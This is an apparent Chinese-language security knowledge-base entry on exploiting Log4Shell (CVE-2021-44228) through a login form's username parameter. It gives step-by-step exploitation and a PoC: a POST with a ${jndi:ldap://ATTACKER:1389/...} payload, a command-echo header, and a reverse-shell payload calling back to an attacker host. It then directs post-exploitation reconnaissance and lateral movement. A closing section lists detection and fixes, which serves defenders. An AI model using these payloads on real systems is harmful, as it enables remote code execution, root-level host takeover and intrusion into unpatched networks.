---
id: web-java-deserialization-jndi-log4j2-login-rce
title: Log4j2 登录参数触发 JNDI 注入并反弹 Shell
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: log4j2-jndi-lookup
tags:
- java
- log4j2
- jndi
- ldap
- rce
- log4shell
cve:
- CVE-2021-44228
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-E
  verified_at: '2026-11-04T19:20:24+08:00'
  notes: 已对照原文核对：/login uname 参数、JNDIExploit LDAP 1389 + TomcatEcho 回显、ReverseShell 回连 root 与图 07-15 一致；PoC 未在本机执行，高版本 JDK 需处理 trustURLCodebase。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-log4j2-login-rce/
draft: false
kb_aliases:
- Log4j2 RCE
- CVE-2021-44228
- log4shell
- 登录框 JNDI 注入
- JNDIExploit TomcatEcho
---

## 一句话结论

应用使用存在漏洞的 Log4j2 记录攻击者可控的登录参数时，向参数写入 `${jndi:ldap://...}` 即可让目标 JVM 主动连接攻击者 LDAP 服务，加载远程类并以应用进程权限执行命令。

## 原理

- Log4j2 在输出日志消息时会对 `${...}` 做 Lookup 求值，`jndi` lookup 允许按名称访问 JNDI 资源。
- 攻击者把 `jndi:ldap://attacker:1389/Basic/TomcatEcho` 作为用户名提交，登录失败逻辑把用户名写入日志，Log4j2 解析后向攻击者 LDAP 服务发起查询。
- 攻击者控制的 LDAP 服务返回带远程 codebase 的 `ResourceRef`（案例中为 TomcatEcho 模板类），目标 JVM 从攻击者 HTTP 服务拉取并加载该类。该类的逻辑读取请求头 `cmd` 并执行命令，把回显写回 HTTP 响应，因此可以在单次请求内看到命令输出。
- 换成反向 Shell 模板并让目标回连即可获得交互式 Shell。案例中回连后的 `id` 为 `uid=0(root)`，说明业务进程以 root 运行，漏洞直接等价于主机控制。
- 成立的关键是 JDK 对 JNDI 远程 codebase 的信任设置：较新 JDK 默认禁止 `com.sun.jndi.ldap.object.trustURLCodebase`，需要改用目标 classpath 上的本地 gadget 或二次反序列化；案例环境允许远程加载。

## 触发条件

- 使用受影响的 Log4j2 版本，且攻击者可控输入（用户名、Header、参数、UA 等）会被记录；
- 目标 JVM 能出站访问攻击者的 LDAP/HTTP 服务，或可被引导到内网可控服务；
- JDK 未禁用远程 codebase，或目标 classpath 存在可用 gadget；
- 命令执行权限取决于应用进程身份；案例中为 root。

## 利用步骤

1. 在登录框等会写日志的入口提交任意值，确认服务端记录该字段；可先用 DNSLOG 确认 JNDI 解析是否发生。
2. 启动 LDAP 与 HTTP 回显服务（案例使用 JNDIExploit，LDAP 监听 1389）。
3. 在可控参数中写入 `${jndi:ldap://ATTACKER:1389/Basic/TomcatEcho}`，并在请求头加入 `cmd: id` 验证回显。
4. 换成反向 Shell 模板，攻击机监听端口，提交请求获取交互式 Shell。
5. 进入主机后确认权限、收集内网信息，再建立代理或继续横向。

## PoC

```http
POST /login HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

uname=${jndi:ldap://ATTACKER:1389/Basic/TomcatEcho}&password=x
```

```text
# TomcatEcho 模板从请求头读取命令
cmd: id
```

```text
# 反向 Shell 模板（参数按所用工具的实际语法替换）
${jndi:ldap://ATTACKER:1389/Basic/ReverseShell/ATTACKER/10011}
```

## 变体与关联

- 变体：`${jndi:rmi://...}`、`${jndi:dns://...}` 做外带验证；Header、UA、日志字段均可作为触发点；高版本 JDK 改用本地 gadget 或二次反序列化。
- 关联：[[web-java-deserialization-jndi-ufida-sprmonitorservlet]]（另一条 JNDI 触发链）；同层 README 的 JNDI/LDAP/RMI 基础。
- 影响边界：案例中应用以 root 运行，命令执行即主机控制；若应用降权运行，仍可读取应用配置、数据库口令与内网信息。

## 检测与防御

- 检测：请求参数/Header 中出现 `${jndi:`、`ldap://`、`rmi://`；应用出站 1389/1099 连接；JVM 日志出现 `JndiLookup`、LDAP 相关异常；类加载或临时目录出现陌生类。
- 修复：升级 Log4j2 到修复版本；无法升级时移除 `JndiLookup` 类或设置 `log4j2.formatMsgNoLookups=true`；JDK 设置 `com.sun.jndi.ldap.object.trustURLCodebase=false`。
- 缓解：限制应用出站 LDAP/RMI/DNS；WAF 拦截 `${jndi:` 特征；应用以最小权限运行，避免 root/Administrator 启动。
